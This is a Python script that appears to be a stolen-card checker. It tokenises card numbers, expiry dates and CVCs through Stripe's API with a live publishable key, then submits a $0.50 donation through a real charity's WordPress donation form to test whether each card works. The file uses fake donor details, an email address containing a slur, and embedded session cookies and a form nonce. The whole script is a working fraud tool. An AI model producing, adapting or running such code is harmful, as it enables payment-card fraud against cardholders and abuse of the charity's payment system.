import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
	}

	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51Ssb1PQKv7Pa5TYrRye5jCnNuoF5AKML2OSyaYolYmYzuIyMCGr7ZcWxiBDI1fpYHvNDpYoxy2J7I2SpdTuwLMZa00IGG1aaXB'
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

	pm = r1.json()['id']

	cookies = {
			'__stripe_mid': '784e53e1-4cea-478b-bb9b-bc343c02d04438b2cd',
    '__stripe_sid': '9ed60aaf-79d6-4adb-b176-fe437a1c208a80ea28',
	}

	headers = {
	'authority': 'saphausa.org',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://saphausa.org',
    'referer': 'https://saphausa.org/donation/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
	}

	params = {
			't': '1786635642591',
	}

	data = {
			'data': '__fluent_form_embded_post_id=5442&_fluentform_1_fluentformnonce=08e4399de5&_wp_http_referer=%2Fdonation%2F&names%5Bfirst_name%5D=Jhon&names%5Blast_name%5D=Anderson&email=blackniggu338%40gmail.com&phone=%2B12025809708&input_text=13th%20Street%20Avenue&input_radio=Donation&payment_input=Custom%20Amout&custom-payment-amount=0.50&message=&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
			'action': 'fluentform_submit',
			'form_id': '1',
	}
	
	r2 = requests.post(
			'https://saphausa.org/wp-admin/admin-ajax.php',
			params=params,
			cookies=cookies,
			headers=headers,
			data=data,
	)
	return (r2.json())